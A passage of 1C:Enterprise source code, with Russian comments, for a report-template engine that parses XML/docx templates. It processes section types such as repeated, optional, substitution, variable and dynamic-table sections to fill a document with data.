//				СодержимоеСекции = ПреобразоватьХМЛВоВнутреннююСтруктуру(ЧтениеХМЛ, ЧтениеХМЛ.ТипУзла);
//				Секция.СодержимоеСекции = СодержимоеСекции;
//			ИначеЕсли ЧтениеХМЛ.ТипУзла = ТипУзлаXML.КонецЭлемента Тогда
//				Если ТипПредыдущегоУзлаХМЛ = ТипУзлаXML.НачалоЭлемента Тогда
//					Возврат """";
//				ИначеЕсли ТипПредыдущегоУзлаХМЛ = ТипУзлаXML.КонецЭлемента Тогда
//					Возврат мРез;
//				КонецЕсли;
//			КонецЕсли;
		ИначеЕсли ЧтениеХМЛ.ЛокальноеИмя = ""ТаблицаОбластей"" Тогда
			Если ЧтениеХМЛ.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
				Секция.Вставить(""ТаблицаОбластей"");
				тзТаблицаОбластей = СоздатьТаблицуОбластей();
			ИначеЕсли ЧтениеХМЛ.ТипУзла = ТипУзлаXML.КонецЭлемента Тогда
				Секция.ТаблицаОбластей = тзТаблицаОбластей;
			КонецЕсли;
		ИначеЕсли ЧтениеХМЛ.ЛокальноеИмя = ""Область"" Тогда
			Если ЧтениеХМЛ.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
				СтрТабОбл = тзТаблицаОбластей.Добавить();
			КонецЕсли;
		Иначе
        	//обработка остальных элементов
			Если ЧтениеХМЛ.ТипУзла = ТипУзлаXML.НачалоЭлемента Тогда
				ЭлементСекции = ЧтениеХМЛ.ЛокальноеИмя;
				ЗначЭлементаСекции = ПреобразоватьХМЛВоВнутреннююСтруктуру(ЧтениеХМЛ, ЧтениеХМЛ.ТипУзла);

				Если ЭлементСекции = ""ШиринаОбласти"" Или ЭлементСекции = ""ВыводитьОбласть""
						Или ЭлементСекции = ""ФиксированнаяШирина"" Или ЭлементСекции = ""УсловиеВидимости"" Тогда
					//заполняем таблицу областей
					//ШиринаОбласти, ВыводитьОбласть, ФиксированнаяШирина нужно преобразовать в число
					Попытка
						ЗначЭлементаСекции = Число(ЗначЭлементаСекции);
					Исключение
					КонецПопытки;

					СтрТабОбл[ЭлементСекции] = ЗначЭлементаСекции;
				Иначе
					Если Не Секция.Свойство(ЭлементСекции) Тогда
						//вставляем дополнительные атрибуты секции для динамической таблицы
						Секция.Вставить(ЭлементСекции);
					КонецЕсли;

					//цТипСекции нужно преобразовать в число
					Если ЭлементСекции = ""цТипСекции"" Тогда
						Попытка
							ЗначЭлементаСекции = Число(ЗначЭлементаСекции);
						Исключение
						КонецПопытки;								
					КонецЕсли;

					Секция[ЭлементСекции] = ЗначЭлементаСекции;
				КонецЕсли;
			ИначеЕсли ЧтениеХМЛ.ТипУзла = ТипУзлаXML.КонецЭлемента Тогда
				Если ТипПредыдущегоУзлаХМЛ = ТипУзлаXML.НачалоЭлемента Тогда
					//содержимое секции пусто (для атомарных секций)
					Возврат """";
				ИначеЕсли ТипПредыдущегоУзлаХМЛ = ТипУзлаXML.КонецЭлемента Тогда
					//в содержимом секции есть вложенные секции
					Возврат мРез;
				КонецЕсли;
			КонецЕсли;
		КонецЕсли;
		
		ТипПредыдущегоУзлаХМЛ = ЧтениеХМЛ.ТипУзла;

	КонецЦикла;

	Возврат мРез;
	
КонецФункции

Функция СчитатьСтруктуруШаблонаСобственныйФормат(сТекст)
	ЧтениеХМЛ = Новый ЧтениеXML();
	ЧтениеХМЛ.УстановитьСтроку(сТекст);
	ВнутрСтрукт = ПреобразоватьХМЛВоВнутреннююСтруктуру(ЧтениеХМЛ, ТипУзлаXML.ОбъявлениеXML);
	ЧтениеХМЛ.Закрыть();

	Возврат ВнутрСтрукт;
КонецФункции

#КонецОбласти

#Область ПроцедурыИФункцииОбработкиЭлементовРазметки

// Объединяет в структуре шаблона одноименные подряд идущие секции
//
// Параметры:
//  СтруктШаблон - массив - шаблон отчета во внутренней структуре (или его фрагмент) 
//
Процедура ОбъединитьОдноименныеСекции(СтруктШаблон)
	Если ТипЗнч(СтруктШаблон) = Тип(""Строка"") Тогда
		Возврат;
	КонецЕсли;
	СчЭлем = 1;
	Пока СчЭлем < СтруктШаблон.Количество() Цикл 
		Элем = СтруктШаблон[СчЭлем];
		ПредЭлем = СтруктШаблон[СчЭлем - 1];
		Если ТипЗнч(Элем) = Тип(""Структура"")
			И ТипЗнч(ПредЭлем) = Тип(""Структура"")
			И Не ПустаяСтрока(Элем.сНаименованиеСекции)
			И Элем.сНаименованиеСекции = ПредЭлем.сНаименованиеСекции
			И Элем.сТипСекции = ПредЭлем.сТипСекции
			Тогда
			УдЭлем = СчЭлем;
			Если ТипЗнч(ПредЭлем.СодержимоеСекции) = Тип(""Строка"") Тогда
				Если ТипЗнч(Элем.СодержимоеСекции) = Тип(""Строка"") Тогда
					БуфМасс = Новый Массив;
					БуфМасс.Добавить(ПредЭлем.СодержимоеСекции);
					БуфМасс.Добавить(Элем.СодержимоеСекции);
					ПредЭлем.СодержимоеСекции = БуфМасс;
				Иначе
					Элем.СодержимоеСекции.Вставить(0, ПредЭлем.СодержимоеСекции);
					УдЭлем = СчЭлем - 1;
				КонецЕсли;
			ИначеЕсли ТипЗнч(Элем.СодержимоеСекции) = Тип(""Строка"") Тогда
				ПредЭлем.СодержимоеСекции.Добавить(Элем.СодержимоеСекции); 					
			Иначе
				Для Каждого БуфЭлем Из Элем.СодержимоеСекции Цикл 
					ПредЭлем.СодержимоеСекции.Добавить(БуфЭлем);
				КонецЦикла;
			КонецЕсли;
			СтруктШаблон.Удалить(УдЭлем);
		Иначе 
			Если ТипЗнч(ПредЭлем) = Тип(""Структура"") Тогда 
				ОбъединитьОдноименныеСекции(ПредЭлем.СодержимоеСекции);
			КонецЕсли;
            СчЭлем = СчЭлем + 1;
		КонецЕсли;
	КонецЦикла;
	Элем = СтруктШаблон[СчЭлем - 1];
	Если ТипЗнч(Элем) = Тип(""Структура"") Тогда 
		ОбъединитьОдноименныеСекции(Элем.СодержимоеСекции);
	КонецЕсли;
КонецПроцедуры

// Нормализация содержимого секции. Необходимо из-за динамических таблиц,
// при их перестроении возможна ситуация при которой в содержимом будет массив, а не строка
// 
// Параметры:
// 	СодержимоеСекции - строка или массив - in, строка или массив, содержащая все вложенные тэги найденой секции
// Возвращаемое значение:
//  строка - строка, содержащая текст секции
//
Функция НормализоватьСодержимоеСекции(СодержимоеСекции)
	// если строка, то возвращаем ее
	Если ТипЗнч(СодержимоеСекции) = Тип(""Строка"") Тогда
		Возврат СодержимоеСекции;
	// если массив, то формируем по нему строку
	ИначеЕсли ТипЗнч(СодержимоеСекции) = Тип(""Массив"") Тогда
		сТекстСекции = """";
		Для Каждого Элем Из СодержимоеСекции Цикл
			// обрабатываем только строки и массивы, остальное пропускаем, т.к.  
			// этот метод используется только для атомарных элементов разметки,
			// и если такая ситуация возникла, то это некоректная разметка шаблона
			сТекстСекции = сТекстСекции + НормализоватьСодержимоеСекции(Элем);
		КонецЦикла;
		Возврат сТекстСекции;
	Иначе // если что то непонятное, то возвращаем пустую строку
		Возврат """";
	КонецЕсли;
КонецФункции

// Получает текст секции (текст между первым открывающим тэгом <w:t> и 
// последним закрывающим тэгом </w:t>, тэг <w:t>...</w:t> является атомарным, 
// т.е. не содержит других тэгов)
//
// Параметры:
// 	СодержимоеСекции - строка или массив - in, строка или массив, содержащая все вложенные тэги найденой секции
// 	сТекстДляЗамены - строка - out, возвращается строка вместо которой необходимо вставить значение
//					   (текст между первым открывающим тэгом <w:t> и 
// 						последним закрывающим тэгом </w:t>)
//
// Возвращаемое значение:
//  строка - строка, содержащая текст секции
//
Функция ПолучитьТекстСекции(СодержимоеСекции, сТекстДляЗамены = """")
	сТекстДляЗамены = """";
	сТекстСекции = """";
	// необходимо в случае когда на вход приходит массив, а не строка, 
	// такое может произойти при перестроении динамической таблицы
	СодержимоеСекции = НормализоватьСодержимоеСекции(СодержимоеСекции);
	// ищем первый открывающий тэг <w:t>
	цИндексНачалаТекстаДляЗамены = Найти(СодержимоеСекции, ""<w:t>"");
	цИндексНачалаТекстаДляЗамены1 = Найти(СодержимоеСекции, ""<w:t "");
	Если цИндексНачалаТекстаДляЗамены1 > 0 И 
		 (цИндексНачалаТекстаДляЗамены = 0 Или цИндексНачалаТекстаДляЗамены1 < цИндексНачалаТекстаДляЗамены) Тогда
		цИндексНачалаТекстаДляЗамены = цИндексНачалаТекстаДляЗамены1;
	КонецЕсли;
	Если цИндексНачалаТекстаДляЗамены > 0 Тогда
		// если тэг нашли, то запоминаем начало, ищем последний закрывающий тэг </w:t> и формируем текст секции
		цИндексНачалаТекста = цИндексНачалаТекстаДляЗамены;
		цИндексНачалаТекстаДляЗамены = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СодержимоеСекции, "">"", цИндексНачалаТекстаДляЗамены + 4) + 1;
		Пока цИндексНачалаТекста > 0 Цикл
			// ищем закрывающий тэг <w:t>
			цИндексНачалаТекста = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СодержимоеСекции, "">"", цИндексНачалаТекста + 4) + 1;
			цИндексКонцаТекста = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СодержимоеСекции, ""</w:t>"", цИндексНачалаТекста);
			// формирование текста секции 
			сТекстСекции = сТекстСекции + Сред(СодержимоеСекции, 
											   цИндексНачалаТекста,
								  			   цИндексКонцаТекста - цИндексНачалаТекста);
			// ищем открывающий тэг <w:t>
			цИндексНачалаТекста = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СодержимоеСекции, 
											    ""<w:t>"", 
												цИндексКонцаТекста + СтрДлина(""</w:t>""));
			цИндексНачалаТекста1 = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(СодержимоеСекции, 
											    ""<w:t "", 
												цИндексКонцаТекста + СтрДлина(""</w:t>""));
			Если цИндексНачалаТекста1 > 0 И (цИндексНачалаТекста = 0 Или цИндексНачалаТекста1 < цИндексНачалаТекста) Тогда
				цИндексНачалаТекста = цИндексНачалаТекста1;
			КонецЕсли;
		КонецЦикла;
		// получаем строку вместо которой необходимо вставить значение
		сТекстДляЗамены = Сред(СодержимоеСекции, 
							   цИндексНачалаТекстаДляЗамены,
							   цИндексКонцаТекста - цИндексНачалаТекстаДляЗамены);
	КонецЕсли;
	Возврат сТекстСекции;
КонецФункции

// Получает данные для вывода в отчет посредством обращения к вызвашему объекту
// 
// Параметры:
//  сПараметр - строка - текст выражения которое должен вычислить вызвааший объект 
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
// Возвращаемое значение:
//  любой тип - результат вычисления выражения предметным модулем (вызвавшим объектом)
//
Функция ПолучитьДанные(сПараметр, Контекст)
	сПараметр = СтрЗаменить(сПараметр, ""&lt;"", ""<""); 
	сПараметр = СтрЗаменить(сПараметр, ""&gt;"", "">""); 
	сПараметр = СтрЗаменить(сПараметр, ""&quot;"", """"""""); 
	сПараметр = СтрЗаменить(сПараметр, ""«"", """"""""); 
	сПараметр = СтрЗаменить(сПараметр, ""»"", """"""""); 
	сПараметр = СтрЗаменить(сПараметр, ""#"", ""Контекст.Переменные.""); 
	
	Если КодСимвола(сПараметр) = КодСимвола(""."") Тогда
		КоличествоТочек = 0;
		Пока КодСимвола(сПараметр) = КодСимвола(""."") Цикл
			сПараметр = Сред(сПараметр, 2);
			КоличествоТочек = КоличествоТочек + 1;
		КонецЦикла;
		ИндексИтератора = Контекст.Итераторы.Количество() - КоличествоТочек;
		сПараметр = ""Контекст.Итераторы["" + ИндексИтератора + ""].ТекЭлем."" + сПараметр;
	КонецЕсли;
	
	Возврат Контекст.ВызвавшийОбъект.ПолучитьДанные(сПараметр, Новый Структура(""Переменные, Итераторы"", Контекст.Переменные, Контекст.Итераторы));
КонецФункции

// Обработка секции текста (секция ограниченная тэгами <Секция> и </Секция>),
// по тексту секции определяются данные из базы и потставляются вместо секции.
// Результат обработки секции выводится в Контекст.Рез(ТекстовыйДокумент). 
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииТекста(Секция, Контекст)
	Если Не Секция.Свойство(""сТекстСекции"") Тогда 
		сТекстДляЗамены = """";
		// выделяем текст
		сТекстСекции = ПолучитьТекстСекции(Секция.СодержимоеСекции, сТекстДляЗамены);
		Секция.Вставить(""сТекстСекции"", сТекстСекции);
		Секция.Вставить(""сТекстДляЗамены"", сТекстДляЗамены);
	КонецЕсли;
	// пытаемся получить данные, если неудачно, то """"
	Попытка
		сДанные = ПолучитьДанные(Секция.сТекстСекции, Контекст);
	Исключение
		Сообщить(""Ошибка при вычислении выражения секции:"" + Символы.ПС + Секция.сТекстСекции 
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
		сДанные = """";
	КонецПопытки;
	сДанные = СтрЗаменить(сДанные, ""<"", ""&lt;""); 
	сДанные = СтрЗаменить(сДанные, "">"", ""&gt;"");  
	сДанные = СтрЗаменить(сДанные, ""&"", ""&amp;"");  
	// заменяем символы перевода строки 1С на строки ""<новабзац>"", которые обработаем позже
	сДанные = СтрЗаменить(сДанные, Символ(182), ""<новабзац>"");
	сДанные = СтрЗаменить(сДанные, Символы.ПС, ""<новабзац>"");
	// заменяем текст
	Буф = СтрЗаменить(Секция.СодержимоеСекции, Секция.сТекстДляЗамены, сДанные);
	// в формате docx для строк начинающихся и кончающихся с пробелов тег <w:t> должен иметь атрибут 
	// xml:space=""preserve"", иначе пробелы будут отрезаны, для формата xml свойство не имеет значения
	Если сДанные <> СокрЛП(сДанные) Тогда
		Буф = СтрЗаменить(Буф, ""<w:t>"", ""<w:t xml:space=""""preserve"""">"");
	КонецЕсли;
	Контекст.Рез.ДобавитьСтроку(Буф);	
КонецПроцедуры

// Обработка секции ""ОпределениеПодстановки"". Фрагмент шаблона, окруженный данной секцией,
// запоминается под заданным именем в стэке подстановок - Контекст.Подстановки(структура).
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииОпределениеПодстановки(Секция, Контекст)
	Попытка
		Контекст.Подстановки.Вставить(Секция.сНаименованиеСекции, Секция.СодержимоеСекции);					  
	Исключение
		Сообщить(""Неверное определение подстановки:"" + Символы.ПС + Секция.сНаименованиеСекции 
				+ Символы.ПС + "" - неверное имя подстановки""
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
	КонецПопытки;
КонецПроцедуры

// Обработка секции ""Подстановка"". Из стэка подстановок (Контекст.Подстановки) берется фрагмент шаблона,
// результат обработки данного ""мини-шаблона"" и выводится в результат (Контекст.Рез).
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииПодстановка(Секция, Контекст)
	Перем Подстановка;
	
	Если Не Секция.Свойство(""сИмяПодстановки"") Тогда 
		// выделяем текст
		сИмяПодстановки = ПолучитьТекстСекции(Секция.СодержимоеСекции);
		Секция.Вставить(""сИмяПодстановки"", сИмяПодстановки);
	КонецЕсли;
	Попытка
		Если Контекст.Подстановки.Свойство(Секция.сИмяПодстановки, Подстановка) Тогда
			ОбработкаШаблона(Подстановка, Контекст);
		Иначе	
			Сообщить(""Не определена подстановка: "" + сИмяПодстановки);
		КонецЕсли;
	Исключение
		Сообщить(""Неверное обращение к подстановке:"" + Символы.ПС + сИмяПодстановки 
				+ Символы.ПС + "" - неверное имя подстановки""
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
	КонецПопытки;
КонецПроцедуры

// Обработка секции ""Коммент"". Включает режим ""Коммент"" при выполнении отчета, это значит,
// что весь результат выполнения фрагмента шаблона окруженного секцией Коммент не попадает в результирующий
// отчет, но фрагмент тем не менее будет обрабатываться стандартным алгоритмом, т.к. в нм могут быть 
// инициализированы необходимые переменные или определены подстановки
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииКоммент(Секция, Контекст)
	бЗапомнитьРежимКоммент = Контекст.РежимКоммент;
	Контекст.РежимКоммент = Истина;
	ОбработкаШаблона(Секция.СодержимоеСекции, Контекст);
	Контекст.РежимКоммент = бЗапомнитьРежимКоммент;
КонецПроцедуры

// Обработка секции ""Переменная"". Вычисляется заданное выражение и сохраняется по заданным именем в 
// стэке переменных - Контекст.Переменные(структура).
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииПеременной(Секция, Контекст)
	Если Не Секция.Свойство(""сИмяПараметра"") Тогда 
		// выделяем текст
		сТекстСекции = ПолучитьТекстСекции(Секция.СодержимоеСекции);
		цПозРавно = Найти(сТекстСекции, ""="");
		Если цПозРавно = 0 Тогда 
			Сообщить(""Неверное определение переменной:"" + Символы.ПС + сТекстСекции 
					+ Символы.ПС + "" - отсутствует символ ="");
		Иначе			
			сИмяПараметра = Лев(сТекстСекции, цПозРавно - 1); 
			сЗначениеПараметра = Сред(сТекстСекции, цПозРавно + 1);
		КонецЕсли;
		Секция.Вставить(""сИмяПараметра"", сИмяПараметра);
		Секция.Вставить(""сЗначениеПараметра"", сЗначениеПараметра);
		Секция.Вставить(""сТекстСекции"", сТекстСекции);
	КонецЕсли;
	
	Попытка
		ЗначениеПараметра = ПолучитьДанные(Секция.сЗначениеПараметра, Контекст);
		Попытка
			Контекст.Переменные.Вставить(Секция.сИмяПараметра, ЗначениеПараметра);
		Исключение
			Сообщить(""Неверное определение переменной:"" + Символы.ПС + Секция.сТекстСекции 
					+ Символы.ПС + "" - неверное имя переменной""
					+ Символы.ПС + ИнформацияОбОшибке().Описание);
		КонецПопытки;
	Исключение
		Сообщить(""Неверное определение переменной:"" + Символы.ПС + Секция.сТекстСекции 
				+ Символы.ПС + "" - ошибка при вычислении выражения ""
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
	КонецПопытки;
КонецПроцедуры

// Обработка секции ""Объединить"". Вместо секции в отчет выводится результат вычисления логического
// выражения приведенный к 0/1 и окруженный скобками <ns0:Объединить>"" + сДанные + ""</ns0:Объединить>.
// Такие комбинации будут обработаны позже в методе ОбъединениеЯчеек.
// Результат обработки секции выводится в Контекст.Рез(ТекстовыйДокумент). 
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииОбъединить(Секция, Контекст)
	Перем сТекстСекции;
	
	Если Не Секция.Свойство(""сТекстСекции"") Тогда 
		// выделяем текст
		сТекстСекции = ПолучитьТекстСекции(Секция.СодержимоеСекции);
		Секция.Вставить(""сТекстСекции"", сТекстСекции);
	КонецЕсли;
	
	Попытка
		сДанные = Число(Булево(ПолучитьДанные(Секция.сТекстСекции, Контекст)));
	Исключение
		Сообщить(""Ошибка при вычислении логического выражения секции """"Объединить"""":"" + Символы.ПС + Секция.сТекстСекции 
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
		сДанные = ""0"";
	КонецПопытки;
	// заменяем текст (но оставляем теги)
	Контекст.Рез.ДобавитьСтроку(""<ns0:Объединить>"" + сДанные + ""</ns0:Объединить>"");
КонецПроцедуры

// Обработка секции ""НачатьЗаново"". Если результат вычисления логического
// выражения = истина, то вместо данной секции выводится ""<ns0:НЗ>1</ns0:НЗ>"", 
// иначе не выводится ничего.
// Такие комбинации будут обработаны позже в методе РестартСписков.
// Результат обработки секции выводится в Контекст.Рез(ТекстовыйДокумент). 
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииНачатьЗаново(Секция, Контекст)
	Перем сТекстСекции;
	Перем Данные;
	
	Если Не Секция.Свойство(""сТекстСекции"") Тогда 
		// выделяем текст
		сТекстСекции = ПолучитьТекстСекции(Секция.СодержимоеСекции);
		Секция.Вставить(""сТекстСекции"", сТекстСекции);
	КонецЕсли;
	
	Попытка
		Данные = Число(Булево(ПолучитьДанные(Секция.сТекстСекции, Контекст)));
	Исключение
		Сообщить(""Ошибка при вычислении логического выражения секции """"НачатьЗаново"""":"" + Символы.ПС + Секция.сТекстСекции 
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
		Данные = 0;
	КонецПопытки;
	// заменяем текст (но оставляем теги)
	Если Данные <> 0 Тогда
		Контекст.Рез.ДобавитьСтроку(""<ns0:НЗ>1</ns0:НЗ>"");
	КонецЕсли;
КонецПроцедуры

// Обработка повторяющейся секции (секция ограниченная тэгами <ПовторяемаяСекция> и 
// </ПовторяемаяСекция>), по атрибуту секции data определяется сущность ""базы"" (Итератора),
// по которой необходимо повторять секцию. Для каждого элемента итератора осуществляется 
// обработка вложенного фрагмента шаблона.
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаПовторяемойСекции(Секция, Контекст)
	Перем сИмяПараметра, сЗначениеПараметра;
	Перем цПозРавно;
	Перем Итератор, ЗаписьИтератора;
	Перем Индекс;
	Перем Элем, ПредыдущЭлем;
	
	Если Не Секция.Свойство(""сИмяПараметра"") Тогда 
		сНаименованиеДанныхДляИтерации = ПостроительОтчетовКлиентСервер.УбратьПробелы(Секция.сДанные);
		цПозРавно = Найти(сНаименованиеДанныхДляИтерации, ""="");
		Если цПозРавно = 0 Тогда 
			сИмяПараметра = """";
			сЗначениеПараметра = сНаименованиеДанныхДляИтерации;
		Иначе			
			сИмяПараметра = Лев(сНаименованиеДанныхДляИтерации, цПозРавно - 1); 
			сЗначениеПараметра = Сред(сНаименованиеДанныхДляИтерации, цПозРавно + 1);
		КонецЕсли;
		Секция.Вставить(""сИмяПараметра"", сИмяПараметра);
		Секция.Вставить(""сЗначениеПараметра"", сЗначениеПараметра);
		Секция.Вставить(""сНаименованиеДанныхДляИтерации"", сНаименованиеДанныхДляИтерации);
	КонецЕсли;
	сИмяПараметра = Секция.сИмяПараметра;
	Попытка
		Итератор = ПолучитьДанные(Секция.сЗначениеПараметра, Контекст);
	Исключение
		Сообщить(""Ошибка при вычислении выражения для итератора повторяемой секции:"" + Символы.ПС
				+ Секция.сНаименованиеДанныхДляИтерации
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
		Возврат;
	КонецПопытки;
	Попытка
		Колво = Итератор.Количество();
	Исключение
		Сообщить(""Объект данных для итерации не является коллекцией:"" + Символы.ПС
				+ Секция.сНаименованиеДанныхДляИтерации
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
		Возврат;
	КонецПопытки;
	Если Не ПустаяСтрока(сИмяПараметра) Тогда
		Попытка
			Контекст.Переменные.Вставить(сИмяПараметра, Неопределено);
		Исключение
			Сообщить(""Неверное определение переменной:"" + Символы.ПС + Секция.сНаименованиеДанныхДляИтерации 
					+ Символы.ПС + "" - неверное имя переменной""
					+ Символы.ПС + ИнформацияОбОшибке().Описание);
			Возврат;
		КонецПопытки;
	КонецЕсли;		
	ЗаписьИтератора = Контекст.Итераторы.Добавить();
	ЗаписьИтератора.Итератор = Итератор;
	ЗаписьИтератора.Имя = сИмяПараметра;
	Если Не ПустаяСтрока(сИмяПараметра) Тогда
		Контекст.Переменные.Вставить(сИмяПараметра + ""Количество"", Итератор.Количество());
		Контекст.Переменные.Вставить(сИмяПараметра);
		Контекст.Переменные.Вставить(сИмяПараметра + ""Предыдущ"");
	КонецЕсли;
	// формируем результат
	сРезультат = """";
	Индекс = 1;
	Для каждого Элем Из Итератор Цикл
		ЗаписьИтератора.ТекЭлем = Элем;
		Если Не ПустаяСтрока(сИмяПараметра) Тогда
			Если Индекс = 1 Тогда 
				Контекст.Переменные.Вставить(сИмяПараметра + ""Предыдущ"", Элем);
			Иначе
				Контекст.Переменные[сИмяПараметра + ""Предыдущ""] = Контекст.Переменные[сИмяПараметра];
			КонецЕсли;
			Контекст.Переменные.Вставить(сИмяПараметра, Элем);
			Контекст.Переменные.Вставить(сИмяПараметра + ""Индекс"", Индекс);
		КонецЕсли;		
		// вызываем обработку узла для секции итератора
		ОбработкаШаблона(Секция.СодержимоеСекции, Контекст);
		Индекс = Индекс + 1;
	КонецЦикла;
	Контекст.Итераторы.Удалить(ЗаписьИтератора);
	Если Не ПустаяСтрока(сИмяПараметра) Тогда
		Контекст.Переменные.Удалить(сИмяПараметра);
		Контекст.Переменные.Удалить(сИмяПараметра + ""Индекс"");
		Контекст.Переменные.Удалить(сИмяПараметра + ""Количество"");
		Контекст.Переменные.Удалить(сИмяПараметра + ""Предыдущ"");
	КонецЕсли;
КонецПроцедуры

// Обработка необязательной секции (секция ограниченная тэгами <НеобязательнаяСекция> и 
// </НеобязательнаяСекция>). По наименованию секции проверяем условие и решаем выводить  
// содержимое секции или нет
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаНеобязательнойСекции(Секция, Контекст)
	Перем цРезультат;
	
	// пытаемся проверить условие, если не получилось то не выводим
	Попытка
		цРезультат = ПолучитьДанные(Секция.сНаименованиеСекции, Контекст);
	Исключение
		Сообщить(""Ошибка при вычислении логического выражения необязательной секции:"" + Символы.ПС + Секция.сНаименованиеСекции 
				+ Символы.ПС + ИнформацияОбОшибке().Описание);
		цРезультат = 0;
	КонецПопытки;
	// формируем результат, если результат проверки условия не 0, то обрабатываем содержимое секции
	Если цРезультат > 0 Тогда
		ОбработкаШаблона(Секция.СодержимоеСекции, Контекст);
	КонецЕсли;
КонецПроцедуры

// Обработка секции ""ИзФайла"". Вместо секции в отчет выводится содержимое указанного в секции
// файла. Результат обработки секции выводится в Контекст.Рез (ТекстовыйДокумент). 
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииИзФайла(Секция, Контекст)
	Если Константы.ОбработкаФрагментовНаСервере.Получить() Тогда
		СервернаяОбработкаСекцииИзФайла(Секция, Контекст);
	Иначе
		ПодготовкаДляКлиентскойОбработкиСекцииИзФайла(Секция, Контекст);
		Контекст.ОбработкаФрагментовНаСервере = Ложь;
	КонецЕсли;
КонецПроцедуры

// Обработка секции Клонка (секция ограниченная тэгами <Колонка> и 
// </Колонка>). Эти секции после предварительной подготовки фрагмента динамической таблицы к выводу остались
// только номинально и смысла не несут, но внутри могут быть вложенные секции или фрагменты текста
// поэтому их надо вывести.
// 
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииКолонка(Секция, Контекст)
	ОбработкаШаблона(Секция.СодержимоеСекции, Контекст);
КонецПроцедуры

// Обработка динамической таблицы (секция ограниченная тэгами <ДинамическаяТаблица> и 
// </ДинамическаяТаблица>), осуществляем переформирование динамической таблицы:
// скрываем столбцы, пересчитываем ширины видимых столбцов
//
// Параметры:
//  Секция - структура - in, обрабатываемая секция
//  Контекст - структура - создается в начале формирования отчета и содержит необходимое окружение
//						   для определения режимов вывода, обращения к вызвавшему обекту, 
//						   определнные в ходе выполнения отчета переменные, подстановки и т.п.
//
Процедура ОбработкаСекцииДинамическаяТаблица(Секция, Контекст)
	// вычисляем видимость колонок
	Для Каждого Обл Из Секция.ТаблицаОбластей Цикл
		Если Не ПустаяСтрока(Обл.УсловиеВидимости) Тогда 
			Попытка
				цВыводитьКолонку = ПолучитьДанные(Обл.УсловиеВидимости, Контекст);
			Исключение
				Сообщить(""Ошибка при вычислении логического выражения колонки:"" + Символы.ПС + Обл.УсловиеВидимости
						+ Символы.ПС + ИнформацияОбОшибке().Описание);
				цВыводитьКолонку = 0;
			КонецПопытки;
			// обрабатывается только Ложь, Истина, 0 и 1, другие приводятся к
			Если ТипЗнч(цВыводитьКолонку) = Тип(""Булево"") Тогда
				цВыводитьКолонку = ?(цВыводитьКолонку, 1, 0);
			ИначеЕсли ТипЗнч(цВыводитьКолонку) = Тип(""Число"") Тогда
				Если Не (цВыводитьКолонку = 1) Тогда 
					цВыводитьКолонку = 0;
				КонецЕсли;
			Иначе
				цВыводитьКолонку = 0;
			КонецЕсли;
			
			Обл.ВыводитьОбласть = цВыводитьКолонку; 
